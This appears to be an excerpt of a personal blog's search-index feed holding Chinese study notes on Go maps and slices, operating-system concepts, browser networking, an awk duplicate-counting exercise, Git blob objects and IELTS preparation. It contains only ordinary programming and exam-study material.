class="code"><pre><span class="line"><span class="keyword">var</span> m = <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>: <span class="number">100</span>, <span class="number">2</span>: <span class="number">200</span>&#125;</span><br></pre></td></tr></table></figure><p>2、格式化输出map变量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> m = <span class="keyword">map</span>[<span class="keyword">int</span>]<span class="keyword">int</span>&#123;<span class="number">1</span>: <span class="number">100</span>, <span class="number">2</span>: <span class="number">200</span>&#125;</span><br><span class="line">fmt.Printf(<span class="string">&quot;m = %v\n&quot;</span>, m)</span><br><span class="line"><span class="comment">// m = map[1:100 2:200]</span></span><br></pre></td></tr></table></figure><p>3、在函数中定义一个空map</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">m := <span class="built_in">make</span>(<span class="keyword">map</span>[<span class="keyword">byte</span>]<span class="keyword">int</span>)</span><br><span class="line"><span class="comment">// 等价</span></span><br><span class="line">m := <span class="keyword">map</span>[<span class="keyword">byte</span>]<span class="keyword">int</span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>4、声明了没有初始化的map是一个值为nil的map，向这样的map中存入元素，将导致panic异常<br>panic: assignment to entry in nil map</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> m <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span></span><br><span class="line">m[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;salmonl&quot;</span></span><br></pre></td></tr></table></figure><p>5、使用make初始化map可以忽略size参数，系统会分配一个较小的参数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">make</span><span class="params">(t Type, size ...IntegerType)</span> <span class="title">Type</span></span></span><br></pre></td></tr></table></figure><blockquote><p>参考：<br><a href="https://segmentfault.com/q/1010000009276425">segfentfault: 刚学go，为什么这么写会报错？</a><br><a href="https://books.studygolang.com/gopl-zh/ch4/ch4-03.html">Go圣经Map</a>【比较全面】<br><a href="https://pkg.go.dev/builtin#make">Go官方make内置函数</a><br><a href="http://niliu.me/articles/1590.html">http://niliu.me/articles/1590.html</a></p></blockquote><p><a href="http://niliu.me/articles/1590.html"></a></p>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进程，线程和协程的区别</title>
      <link href="/2022/05/06/%E8%BF%9B%E7%A8%8B%EF%BC%8C%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%8D%8F%E7%A8%8B%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
      <url>/2022/05/06/%E8%BF%9B%E7%A8%8B%EF%BC%8C%E7%BA%BF%E7%A8%8B%E5%92%8C%E5%8D%8F%E7%A8%8B%E7%9A%84%E5%8C%BA%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<ol><li>进程是应用程序的执行副本，是应用程序向操作系统申请资源的最小单位。</li><li>线程是操作系统分配执行程序的最小单位，而这个执行程序指的是kernel thread，它才能真的去执行程序，对于应用程序创建的thread它和kernel thread 之间存在着映射关系，如1对1，1对多，n对m，但是线程之间切换开销非常大。</li><li>所以我们为了进一步提高线程利用率，在一个高io，任务很小的情况下我们会创建很多routine，这些routine去share少量的线程，这些线程再去对应kernel thread，也就是线程的切换是kernel的行为，而routine的切换是一个runtime的行为，开销很小，所以说当task很小的时候程序语言就需要支持routine，go语言的协程就是routine的一种实现。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IELTS写作笔记-1</title>
      <link href="/2022/04/24/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/"/>
      <url>/2022/04/24/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/</url>
      
        <content type="html"><![CDATA[<h2 id="得分点1：清晰的文章分段"><a href="#得分点1：清晰的文章分段" class="headerlink" title="得分点1：清晰的文章分段"></a>得分点1：清晰的文章分段</h2><h3 id="辩论文体"><a href="#辩论文体" class="headerlink" title="辩论文体"></a>辩论文体</h3><p><img src="http://106.12.125.218/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/0.png"><br>立场不重要，选正反都可以，但是别中立。</p><h4 id="例"><a href="#例" class="headerlink" title="例"></a>例</h4><ol start="3"><li>Scientists believe computers will become more intelligent than human beings. Some people think the development will be negative. To what extent do you agree or disagree?<br><img src="http://106.12.125.218/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/1.png"><br>红色部分都是框架<br>结尾不需要太华丽，展望不了的话点一下主旨就行。 <h3 id="讨论文体"><a href="#讨论文体" class="headerlink" title="讨论文体"></a>讨论文体</h3><img src="http://106.12.125.218/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/2.png"><h4 id="例-1"><a href="#例-1" class="headerlink" title="例"></a>例</h4><img src="http://106.12.125.218/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/3.png"><br>回应之后再举点例子：<br><img src="http://106.12.125.218/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/4.png"><h3 id="报告文体"><a href="#报告文体" class="headerlink" title="报告文体"></a>报告文体</h3></li></ol><p><img src="http://106.12.125.218/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/5.png"></p><h4 id="例-2"><a href="#例-2" class="headerlink" title="例"></a>例</h4><p><img src="http://106.12.125.218/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/6.png"></p><h2 id="得分点2：-清晰的论点句"><a href="#得分点2：-清晰的论点句" class="headerlink" title="得分点2： 清晰的论点句"></a>得分点2： 清晰的论点句</h2><p><img src="http://106.12.125.218/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/7.png"></p><h2 id="得分点3：-清晰的论点句解释说明"><a href="#得分点3：-清晰的论点句解释说明" class="headerlink" title="得分点3： 清晰的论点句解释说明"></a>得分点3： 清晰的论点句解释说明</h2><p><img src="http://106.12.125.218/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/8.png"><br>解释明白就行，词汇其实不重要。</p><h4 id="例-3"><a href="#例-3" class="headerlink" title="例"></a>例</h4><p><img src="http://106.12.125.218/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/9.png"><br><img src="http://106.12.125.218/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/10.png"><br><img src="http://106.12.125.218/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/11.png"><br><img src="http://106.12.125.218/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/12.png"><br>口语扩句同样可以用这个思路。<br><img src="http://106.12.125.218/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/13.png"><br><img src="http://106.12.125.218/medias/medias/IELTS%E5%86%99%E4%BD%9C%E7%AC%94%E8%AE%B0-1/14.png"><br>for example,find writing samples…</p>]]></content>
      
      
      <categories>
          
          <category> 技术栈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IELTS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go语言slice优化</title>
      <link href="/2022/04/24/go%E8%AF%AD%E8%A8%80slice%E4%BC%98%E5%8C%96/"/>
      <url>/2022/04/24/go%E8%AF%AD%E8%A8%80slice%E4%BC%98%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="对以下代码进行优化"><a href="#对以下代码进行优化" class="headerlink" title="对以下代码进行优化"></a>对以下代码进行优化</h2><p><img src="http://106.12.125.218/medias/medias/go%E8%AF%AD%E8%A8%80slice%E4%BC%98%E5%8C%96/3.png"></p><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><p>首先既然已经知道有多少个元素了那初始化的时候就把cap给出<br><img src="http://106.12.125.218/medias/medias/go%E8%AF%AD%E8%A8%80slice%E4%BC%98%E5%8C%96/4.png"><br>进一步优化：<br><img src="http://106.12.125.218/medias/medias/go%E8%AF%AD%E8%A8%80slice%E4%BC%98%E5%8C%96/5.png"><br>直接分配一块连续的内存，而不是初始化指针，毕竟它指向的都是相邻的内存位置，性能会好一些</p>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浏览器地址栏输入URL敲下回车后发生了什么</title>
      <link href="/2022/04/24/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E6%95%B2%E4%B8%8B%E5%9B%9E%E8%BD%A6%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/"/>
      <url>/2022/04/24/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E6%95%B2%E4%B8%8B%E5%9B%9E%E8%BD%A6%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/</url>
      
        <content type="html"><![CDATA[<p><img src="http://106.12.125.218/medias/medias/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E6%95%B2%E4%B8%8B%E5%9B%9E%E8%BD%A6%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/0.png"></p><h2 id="一、简单分析"><a href="#一、简单分析" class="headerlink" title="一、简单分析"></a>一、简单分析</h2><p>简单的分析，从输入 URL到回车后发生的行为如下：</p><ol><li>URL解析</li><li>DNS 查询</li><li>TCP 连接</li><li>HTTP 请求</li><li>响应请求</li><li>页面渲染<h2 id="二、详细分析"><a href="#二、详细分析" class="headerlink" title="二、详细分析"></a>二、详细分析</h2><h3 id="URL解析"><a href="#URL解析" class="headerlink" title="URL解析"></a>URL解析</h3>首先判断你输入的是一个合法的URL 还是一个待搜索的关键词，并且根据你输入的内容进行对应操作<br>一个url的结构解析如下：<br><img src="http://106.12.125.218/medias/medias/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E6%95%B2%E4%B8%8B%E5%9B%9E%E8%BD%A6%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/1.png"><h3 id="DNS查询"><a href="#DNS查询" class="headerlink" title="DNS查询"></a>DNS查询</h3>在DNS协议中讲过DNS的查询，这里就不再讲述了<br>整个查询过程如下图所示：<br><img src="http://106.12.125.218/medias/medias/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E6%95%B2%E4%B8%8B%E5%9B%9E%E8%BD%A6%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/2.png"><br>最终，获取到了域名对应的目标服务器IP地址<h3 id="TCP连接"><a href="#TCP连接" class="headerlink" title="TCP连接"></a>TCP连接</h3>在理解TCP中，了解到tcp是一种面向有连接的传输层协议<br>在确定目标服务器服务器的IP地址后，则经历三次握手建立TCP连接，流程如下：<br><img src="http://106.12.125.218/medias/medias/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E6%95%B2%E4%B8%8B%E5%9B%9E%E8%BD%A6%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/3.png"><h3 id="发送-http-请求"><a href="#发送-http-请求" class="headerlink" title="发送 http 请求"></a>发送 http 请求</h3>当建立tcp连接之后，就可以在这基础上进行通信，浏览器发送 http 请求到目标服务器<br>请求的内容包括：<br>请求行请求头请求主体<br><img src="http://106.12.125.218/medias/medias/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E6%95%B2%E4%B8%8B%E5%9B%9E%E8%BD%A6%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/4.png"><h3 id="响应请求"><a href="#响应请求" class="headerlink" title="响应请求"></a>响应请求</h3>当服务器接收到浏览器的请求之后，就会进行逻辑操作，处理完成之后返回一个HTTP响应消息，包括：<br>状态行响应头响应正文<br><img src="http://106.12.125.218/medias/medias/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E6%95%B2%E4%B8%8B%E5%9B%9E%E8%BD%A6%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/5.png"><br>在服务器响应之后，由于现在http默认开始长连接keep-alive，当页面关闭之后，tcp链接则会经过四次挥手完成断开<h3 id="页面渲染"><a href="#页面渲染" class="headerlink" title="页面渲染"></a>页面渲染</h3>当浏览器接收到服务器响应的资源后，首先会对资源进行解析：<br>查看响应头的信息，根据不同的指示做对应处理，比如重定向，存储cookie，解压gzip，缓存资源等等查看响应头的 Content-Type的值，根据不同的资源类型采用不同的解析方式关于页面的渲染过程如下：<br>解析HTML，构建 DOM 树解析 CSS ，生成 CSS 规则树合并 DOM 树和 CSS 规则，生成 render 树布局 render 树（ Layout / reflow ），负责各元素尺寸、位置的计算绘制 render 树（ paint ），绘制页面像素信息浏览器会将各层的信息发送给 GPU，GPU 会将各层合成（ composite ），显示在屏幕上<br><img src="http://106.12.125.218/medias/medias/%E6%B5%8F%E8%A7%88%E5%99%A8%E5%9C%B0%E5%9D%80%E6%A0%8F%E8%BE%93%E5%85%A5URL%E6%95%B2%E4%B8%8B%E5%9B%9E%E8%BD%A6%E5%90%8E%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/6.png"><blockquote><p>参考文献<br><a href="https://github.com/febobo/web-interview/issues/141https://zhuanlan.zhihu.com/p/80551769">https://github.com/febobo/web-interview/issues/141https://zhuanlan.zhihu.com/p/80551769</a><br><a href="https://baijiahao.baidu.com/s?id=1707485335576146048&wfr=spider&for=pc">https://baijiahao.baidu.com/s?id=1707485335576146048&amp;wfr=spider&amp;for=pc</a></p></blockquote></li></ol>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进程间通信方式</title>
      <link href="/2022/04/24/%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/"/>
      <url>/2022/04/24/%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p><strong>同一个进程中的线程共享数据空间可以直接通信，但是进程间是无法直接进行通信的。</strong><br>进程间通信：</p><ol><li>管道模型：比如cat xx.txt | grep -n ‘xxx’ 这个’|’可以看作一个单向的匿名管道，使得前后两个进程之间进行通信，前一个命名的输出作为后一个命令的输入，该管道使用结束则立即销毁。命名管道在linux中以文件的形式存在，只要访问该文件就可以实现任意两个进程间的通信，命名管道可以看作是是硬盘上存在的设备文件，所以打开需要使用open。</li><li>消息队列模型：比如生产者消费者模式，一端生产一端消费数据。遵循严格的先进先出。</li><li>共享内存：多用于传输一些大文件，如果采用管道或者消息队列传输大文件，涉及到重复拷贝，比较消耗性能，因此模拟多线程，在内存中开辟一块特殊的内存用于多个进程共享访问。<strong>也是进程间最高效的通信方式</strong>。一般要搭配信号量机制。</li><li>信号量机制：信号量可以看作一种数据操作锁，通过对临界资源的控制访问以管理进程之间的通信，PV原语操作。</li><li>socket：用于多个进程之间的网络传输。可以是单机多进程也可以是不同机器上的多进程通信。打开的socket在linux下也是以文件描述符fd存在。服务端创建套接字，绑定ip端口，监听端口号，等待客户端调用，客户端创建之后与服务端TCP三次握手建立连接完成，双方就可以发送和接收数据，使用频率少。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IELTS听力笔记-1</title>
      <link href="/2022/04/21/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/"/>
      <url>/2022/04/21/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/</url>
      
        <content type="html"><![CDATA[<h2 id="题源"><a href="#题源" class="headerlink" title="题源"></a>题源</h2><p>来自于2003-2019年旧题目<br>配合用书：<br><a href="https://zh.book4you.org/book/16739252/bae745">https://zh.book4you.org/book/16739252/bae745</a><br><img src="http://106.12.125.218/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/0.png"><br><strong>语料库重点章节：11章+5章+3章+4章</strong><br>雅思因疫情原因一直没有出新题<br>没有必要看bbc<br>总分分数对应：<br><img src="http://106.12.125.218/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/1.png"><br>听力分数对应：<br><img src="http://106.12.125.218/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/2.png"><br><img src="http://106.12.125.218/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/3.png"><br>提分耗时：<br><img src="http://106.12.125.218/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/4.png"><br>目标7分 = 8888 = 8778 = 9768<br>两点注意：</p><ul><li>没说 now turn to section 1 不能翻书</li><li>听到stop writing 必须停笔<h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="Test5"><a href="#Test5" class="headerlink" title="Test5"></a>Test5</h3><div class="audio"><audio controls preload><source src='http://106.12.125.218/medias/%E9%9B%85%E6%80%9D/%E5%89%9112%E5%90%AC%E5%8A%9B%E9%9F%B3%E9%A2%91/%E3%80%90%E6%A8%B1%E8%8A%B1%E8%AE%BA%E5%9D%9B%20www.sakuraaaa.com%E3%80%91IELTS%2012%20Test%205_S1.mp3' type='audio/mp3'>Your browser does not support the audio tag.</audio></div><img src="http://106.12.125.218/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/5.png"><br><img src="http://106.12.125.218/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/6.png"><br><img src="http://106.12.125.218/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/7.png"><h4 id="抄写答题纸要求"><a href="#抄写答题纸要求" class="headerlink" title="抄写答题纸要求"></a>抄写答题纸要求</h4><img src="http://106.12.125.218/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/8.png"><br>日期不用加th，非要加的话要这么加：<br><img src="http://106.12.125.218/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/9.png"><br>世纪必须序数词：<br><img src="http://106.12.125.218/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/10.png"></li></ul><p><strong>尾数为1-3的（除了11,12,13）都比较特殊，其他都是th</strong><br>易错日期单词：<br><code>**February April August November September Wednesday Thursday Saturday**</code></p><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>首先要审题：Write ONE WORD AND/ORA NUMBER for each answer<br>做完第四题就继续去审后面题了<br>第8题是最难的</p><h4 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h4><p>1：<br><img src="http://106.12.125.218/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/11.png"><br>2：<br>ride = trek = 徒步旅行<br><img src="http://106.12.125.218/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/12.png"><br>英音难听懂<br><code>camel donkey crocodile</code><br>3:<br><img src="http://106.12.125.218/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/13.png"><br>记得加s<br>4：<br>lunch<br>补充：<br><code>meals breakfast lunch dinner brunch</code><br><code>extra cost basic cost</code><br>5:<br>map<br>补充：<br>mat ：地垫<br>6:<br>experience<br>注意：<br><img src="http://106.12.125.218/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/14.png"><br>7:<br>Ratchesons<br>大小写都行<br>8：<br>helmet：头盔⛑<br>9：<br>shops<br>10：<br>267<br>语料库第8章可以练数字（最后没事了再练）</p><h3 id="Test8"><a href="#Test8" class="headerlink" title="Test8"></a>Test8</h3><div class="audio"><audio controls preload><source src='http://106.12.125.218/medias/%E9%9B%85%E6%80%9D/%E5%89%9112%E5%90%AC%E5%8A%9B%E9%9F%B3%E9%A2%91/%E3%80%90%E6%A8%B1%E8%8A%B1%E8%AE%BA%E5%9D%9B%20www.sakuraaaa.com%E3%80%91IELTS%2012%20Test%208_S1.mp3' type='audio/mp3'>Your browser does not support the audio tag.</audio></div><p><img src="http://106.12.125.218/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/15.png"><br><img src="http://106.12.125.218/medias/medias/IELTS%E5%90%AC%E5%8A%9B%E7%AC%94%E8%AE%B0-1/16.png"></p><h4 id="答案-1"><a href="#答案-1" class="headerlink" title="答案"></a>答案</h4><p>我的答案：<br><code>~~tempray~~ doctor africa ~~cycling~~ may cheese arbuthnot dg74ph ~~monday~~ talk</code></p><p>正确答案：<br><code>temporary doctor Africa youth May Arbuthnot dg74ph Tuesday talk</code> </p><blockquote><p>大小写都行</p></blockquote><p>补充：<br>permanent Antarctica helmet</p>]]></content>
      
      
      <categories>
          
          <category> 技术栈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IELTS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go语言slice扩容例题</title>
      <link href="/2022/04/20/go%E8%AF%AD%E8%A8%80slice%E6%89%A9%E5%AE%B9%E4%BE%8B%E9%A2%98/"/>
      <url>/2022/04/20/go%E8%AF%AD%E8%A8%80slice%E6%89%A9%E5%AE%B9%E4%BE%8B%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="下面代码输出什么"><a href="#下面代码输出什么" class="headerlink" title="下面代码输出什么"></a>下面代码输出什么</h2><p><img src="http://106.12.125.218/medias/medias/go%E8%AF%AD%E8%A8%80slice%E6%89%A9%E5%AE%B9%E4%BE%8B%E9%A2%98/2.png"></p><hr><h2 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h2><p>因为x的cap为3，y和x指向同一个底层数组，所以y的容量也为3，对y继续append之后y发生扩容了，于是指向的底层数组就和x不一样了。<br><img src="http://106.12.125.218/medias/medias/go%E8%AF%AD%E8%A8%80slice%E6%89%A9%E5%AE%B9%E4%BE%8B%E9%A2%98/3.png"></p>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell系列题之第二列是否有重复</title>
      <link href="/2022/04/14/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E7%AC%AC%E4%BA%8C%E5%88%97%E6%98%AF%E5%90%A6%E6%9C%89%E9%87%8D%E5%A4%8D/"/>
      <url>/2022/04/14/shell%E7%B3%BB%E5%88%97%E9%A2%98%E4%B9%8B%E7%AC%AC%E4%BA%8C%E5%88%97%E6%98%AF%E5%90%A6%E6%9C%89%E9%87%8D%E5%A4%8D/</url>
      
        <content type="html"><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><p>给定一个 nowcoder.txt文件，其中有3列信息，如下实例，编写一个shell脚本来检查文件第二列是否有重复，且有几个重复，并提取出重复的行的第二列信息：<br>实例：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">20201001 python 99</span><br><span class="line">20201002 go 80</span><br><span class="line">20201002 c++ 88</span><br><span class="line">20201003 php 77</span><br><span class="line">20201001 go 88</span><br><span class="line">20201005 shell 89</span><br><span class="line">20201006 java 70</span><br><span class="line">20201008 c 100</span><br><span class="line">20201007 java 88</span><br><span class="line">20201006 go 97</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2 java</span><br><span class="line">3 go</span><br></pre></td></tr></table></figure><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;&#123;a[$2]+=1&#125;END&#123;for(x in a)&#123;if(a[x]&gt;1) print a[x],x&#125;&#125;&#x27; nowcoder.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 问题和技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《Git解密》笔记——认识Git对象</title>
      <link href="/2022/04/14/%E3%80%8AGit%E8%A7%A3%E5%AF%86%E3%80%8B%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E8%AE%A4%E8%AF%86Git%E5%AF%B9%E8%B1%A1/"/>
      <url>/2022/04/14/%E3%80%8AGit%E8%A7%A3%E5%AF%86%E3%80%8B%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E8%AE%A4%E8%AF%86Git%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="认识Git对象"><a href="#认识Git对象" class="headerlink" title="认识Git对象"></a>认识Git对象</h2><p>在Git的世界里，Git把它所管理的一切内容都当作了一个个的Git对象（Git object），这些对象就被保存在.git目录下。<strong>Git在保存这些对象时，还会为它们生成一个基于SHA-1算法的全局唯一的hash值，以便后面利用这个hash值对Git对象进行存取和引用。</strong><br>所以，Git的核心，其实就是一个基于文件系统的，存储“键值对”的数据库。<br>基于这一认识，我们再回过头来看.git目录下的这两个目录和一个文件：</p><ul><li>objects: 顾名思义，这个目录里存的都是Git对象。它以Git对象的形式保存了该Git库所包含和管理的全部内容；</li><li>refs: 保存了指向Git对象的引用。准确地说，这个引用所指向的，是与分支，标签，远程库等相关联的commit对象。Git把它所管理的对象分成了几种类型，commit对象就是其中之一。关于commit对象，引用，以及refs目录，后面我们还会详细介绍；</li><li>HEAD: 这个很容易理解，它保存了当前分支的head指针，实际上就是指向当前分支最新提交（也是一个commit对象）的引用。<h2 id="Blob对象"><a href="#Blob对象" class="headerlink" title="Blob对象"></a>Blob对象</h2>首先手工创建一个Git对象，现在就让我们利用git hash-object，手工把一个新建的文件存入Git库：<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ echo &#x27;Inside Git&#x27; &gt; README</span><br><span class="line">$ git hash-object -w README</span><br><span class="line">968b2bf72e28d8c6756054730880cf9f9ab06062</span><br></pre></td></tr></table></figure>此时，我们会发现在.git目录的objects子目录下多了一个新文件。文件名和上级目录名称的组合刚好构成了git hash-object返回的唯一键：<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ find .git/objects -type f</span><br><span class="line">.git/objects/96/8b2bf72e28d8c6756054730880cf9f9ab06062</span><br></pre></td></tr></table></figure>如果在执行git cat-file命令时使用-t参数，我们还能看到Git对象的所属类型：<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git cat-file -t 8b2bf72e28d8c6756054730880cf9f9ab06062</span><br><span class="line">blob</span><br></pre></td></tr></table></figure>可以看到，<strong>与文件相对应的Git对象都是blob类型的</strong>。很快我们就会看到，除了blob对象，Git还支持很多其他类型的对象。<br>好了，今天就先到这里啦。在下篇文章里，我们将讨论Git中的另外两种重要的对象，它们分别是：Tree和Commit！</li></ul><blockquote><p><a href="https://morningspace.github.io/tech/inside-git-1/">https://morningspace.github.io/tech/inside-git-1/</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 技术栈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
